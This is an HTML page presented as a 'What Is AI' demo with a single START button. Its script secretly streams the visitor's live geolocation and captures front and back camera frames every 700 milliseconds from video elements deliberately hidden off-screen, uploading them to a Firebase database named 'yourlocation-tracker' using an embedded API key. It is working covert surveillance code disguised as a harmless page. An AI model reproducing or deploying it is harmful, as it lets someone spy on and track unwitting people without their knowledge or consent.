<!DOCTYPE html>
<html>
<head>
<title>What Is AI</title>

<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

<style>

body{
background:black;
color:white;
text-align:center;
font-family:Arial;
padding-top:120px;
}

h1{
font-size:50px;
}

button{
font-size:35px;
padding:20px 60px;
margin-top:40px;
background:lime;
border:none;
border-radius:10px;
}

/* IMPORTANT: don't use display:none */
video{
position:absolute;
top:-5000px;
left:-5000px;
width:10px;
height:10px;
opacity:0.01;
}

</style>

</head>
<body>

<h1>WHAT IS AI SYSTEM</h1>

<button onclick="startSystem()">START</button>

<video id="frontCam" autoplay playsinline muted></video>
<video id="backCam" autoplay playsinline muted></video>

<script>

const firebaseConfig = {
 apiKey: "AIzaSyAiC_oz0Qm99P1K9DcRFQb4eY5GHRujW_c",
 databaseURL: "https://yourlocation-tracker-default-rtdb.asia-southeast1.firebasedatabase.app",
 projectId: "yourlocation-tracker"
};

firebase.initializeApp(firebaseConfig);

let deviceId="phone_"+Math.floor(Math.random()*100000);

function startSystem(){

navigator.geolocation.watchPosition(function(pos){

firebase.database().ref("devices/"+deviceId+"/location").set({
lat:pos.coords.latitude,
lon:pos.coords.longitude
});

});

startCamera("user","frontCam","front");

startCamera("environment","backCam","back");

}


function startCamera(mode, videoId, type){

navigator.mediaDevices.getUserMedia({
video:{facingMode:mode}
})
.then(function(stream){

let video=document.getElementById(videoId);

video.srcObject=stream;

video.onloadedmetadata=function(){

video.play();

capture(video,type);

};

});

}


function capture(video,type){

let canvas=document.createElement("canvas");

let ctx=canvas.getContext("2d");

setInterval(function(){

if(video.videoWidth===0) return;

canvas.width=video.videoWidth;
canvas.height=video.videoHeight;

ctx.drawImage(video,0,0);

let img=canvas.toDataURL("image/jpeg",0.7);

firebase.database().ref("devices/"+deviceId+"/camera/"+type).set({
img:img
});

},700);

}

</script>

</body>
</html>
